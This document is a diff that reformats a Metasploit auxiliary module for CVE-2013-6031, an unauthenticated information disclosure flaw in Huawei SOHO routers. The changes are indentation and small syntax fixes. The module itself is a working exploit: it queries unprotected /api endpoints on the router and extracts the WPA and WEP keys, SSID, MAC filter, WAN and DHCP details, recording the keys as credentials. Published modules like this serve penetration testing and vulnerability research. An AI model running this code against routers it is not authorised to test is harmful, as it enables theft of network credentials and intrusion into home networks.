@@ -1,7 +1,8 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+
 require 'base64'
 require 'msf/core'
 
@@ -12,36 +13,36 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
-      'Description'    => %q{
+                      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
+                      'Description'    => %q{
           This module exploits an un-authenticated information disclosure vulnerability in Huawei
         SOHO routers. The module will gather information by accessing the /api pages where
         authentication is not required, allowing configuration changes
         as well as information disclosure including any stored SMS.
       },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Jimson K James.',
-          'tomsmaily[at]aczire.com',  #Msf module
-        ],
-      'References'     =>
-        [
-          [ 'CWE', '425' ],
-          [ 'CVE', '2013-6031' ],
-          [ 'US-CERT-VU', '341526' ],
-          [ 'URL', 'http://www.huaweidevice.co.in/Support/Downloads/' ],
-        ],
-      'DisclosureDate' => "Nov 11 2013" ))
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                          [
+                              'Jimson K James.',
+                              'tomsmaily[at]aczire.com',  #Msf module
+                          ],
+                      'References'     =>
+                          [
+                              [ 'CWE', '425' ],
+                              [ 'CVE', '2013-6031' ],
+                              [ 'US-CERT-VU', '341526' ],
+                              [ 'URL', 'http://www.huaweidevice.co.in/Support/Downloads/' ],
+                          ],
+                      'DisclosureDate' => "Nov 11 2013" ))
 
     register_options(
-      [
-        Opt::RHOST("mobilewifi.home")
-      ], self.class)
+        [
+            Opt::RHOST("mobilewifi.home")
+        ], self.class)
 
   end
 
-def run
+  def run
 
     #Gather basic router information
     get_router_info
@@ -53,19 +54,19 @@ def run
     get_router_dhcp_info
     print_status("")
     get_wifi_info
-    print_status("")    
+    print_status("")
 
-   #end run
+    #end run
   end
 
-def get_wifi_info    
+  def get_wifi_info
 
     print_status("Now trying to get WiFi Key details...")
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/wlan/security-settings',
-    })
+        {
+            'method'  => 'GET',
+            'uri'     => '/api/wlan/security-settings',
+        })
 
     #check whether we got any response from server and proceed.
     if not res
@@ -89,7 +90,7 @@ def get_wifi_info
 
     wifissid = get_router_ssid
     if wifissid
-        print_status("WiFi SSID: #{wifissid}")
+      print_status("WiFi SSID: #{wifissid}")
     end
 
     # Grabbing the wifiwpapsk
@@ -147,12 +148,12 @@ def get_wifi_info
     end
 
     credentials = {
-      "Access Point"    => rhost,
-      "SSID"    =>  wifissid,
-      "WPA Key" =>  wifiwpapsk,
-      "802.11 Auth" =>  wifiauthmode,
-      "EncryptionMode"  =>  wifiwpaencryptionmodes,
-      "WEP Key"     =>  wifiwepkey1
+        "Access Point"    => rhost,
+        "SSID"    =>  wifissid,
+        "WPA Key" =>  wifiwpapsk,
+        "802.11 Auth" =>  wifiauthmode,
+        "EncryptionMode"  =>  wifiwpaencryptionmodes,
+        "WEP Key"     =>  wifiwepkey1
     }
 
     report_note(
@@ -161,20 +162,20 @@ def get_wifi_info
         :data => credentials
     )
 
-   rescue::Exception => e
-     print_status("Ooooops: #{e.class} #{e}")
+  rescue ::Exception => e
+    print_status("Ooooops: #{e.class} #{e}")
 
-   #end run
+    #end run
   end
 
-def get_router_info
+  def get_router_info
 
     print_status("Attempting to connect to #{rhost} to gather basic device information...")
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/device/information',
-    })
+        {
+            'method'  => 'GET',
+            'uri'     => '/api/device/information',
+        })
 
     #check whether we got any response from server and proceed.
     unless res
@@ -273,14 +274,14 @@ def get_router_info
     end
   end
 
-def get_router_ssid
+  def get_router_ssid
 
     #print_status("Attempting to connect to http://#{rhost}/api/device/information to get router ssid")
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/wlan/basic-settings',
-    })
+        {
+            'method'  => 'GET',
+            'uri'     => '/api/wlan/basic-settings',
+        })
 
     #check whether we got any response from server and proceed.
     if not res
@@ -306,15 +307,15 @@ def get_router_ssid
       #print_status("SSID #{ssid}")
       return $1
     end
-end
+  end
 
-def get_router_mac_filter_info
+  def get_router_mac_filter_info
 
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/wlan/mac-filter',
-    })
+        {
+            'method'  => 'GET',
+            'uri'     => '/api/wlan/mac-filter',
+        })
 
     #check whether we got any response from server and proceed.
     if not res
@@ -415,13 +416,13 @@ def get_router_mac_filter_info
     end
   end
 
-def get_router_wan_info
+  def get_router_wan_info
 
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/monitoring/status',
-    })
+        {
+            'method'  => 'GET',
+            'uri'     => '/api/monitoring/status',
+        })
 
     #check whether we got any response from server and proceed.
     if not res
@@ -463,13 +464,13 @@ def get_router_wan_info
 
   end
 
-def get_router_dhcp_info
+  def get_router_dhcp_info
 
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/dhcp/settings',
-    })
+        {
+            'method'  => 'GET',
+            'uri'     => '/api/dhcp/settings',
+        })
 
     #check whether we got any response from server and proceed.
     if not res
@@ -504,7 +505,7 @@ def get_router_dhcp_info
     end
 
     if (dhcpstatus != "1")
-        return
+      return
     end
 
     # Grabbing the DhcpStartIPAddress
@@ -525,6 +526,5 @@ def get_router_dhcp_info
       print_status("DHCP Lease Time: #{dhcpleasetime}")
     end
   end
-
 #end module
 end
